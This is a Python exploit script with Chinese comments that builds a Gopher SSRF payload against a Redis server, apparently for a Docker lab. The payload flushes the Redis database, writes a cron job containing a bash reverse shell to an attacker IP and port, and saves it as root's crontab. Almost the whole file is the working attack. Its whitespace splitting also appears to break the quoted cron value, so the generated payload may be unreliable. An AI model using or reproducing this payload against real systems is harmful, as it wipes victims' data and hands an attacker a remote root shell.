import urllib.parse

# 1. 替换成你的 IP 地址 (能够被 Docker 容器访问到的地址)
#    在 Linux/macOS 上用 `ip addr | grep "inet "` 或 `ifconfig` 查看
#    在 Windows 上用 `ipconfig` 查看
ATTACKER_IP = "192.168.0.189"  # 示例 IP，请务必修改
ATTACKER_PORT = "4444"

# 2. Redis 命令，注意反弹 shell 命令本身没有双引号
redis_commands = f"""
flushall
set 1 "\\n\\n\\n* * * * * bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1\\n\\n\\n"
config set dir /var/spool/cron
config set dbfilename root
save
"""

# 3. 将命令转换为 RESP 协议格式
def generate_resp(commands):
    resp = ""
    for cmd_line in commands.strip().split('\n'):
        parts = cmd_line.split()
        resp += f"*{len(parts)}\r\n"
        for part in parts:
            resp += f"${len(part)}\r\n{part}\r\n"
    return resp

resp_payload = generate_resp(redis_commands)

# 4. 生成 Gopher URL
# gopher 协议需要将第一个字符吃掉，所以 payload 前面加一个下划线_
# 同时，回车换行符在 URL 中需要编码成 %0D%0A
gopher_url = f"gopher://redis:6379/_{urllib.parse.quote(resp_payload, safe='')}"

print("=== Your Gopher Payload ===")
print(gopher_url)
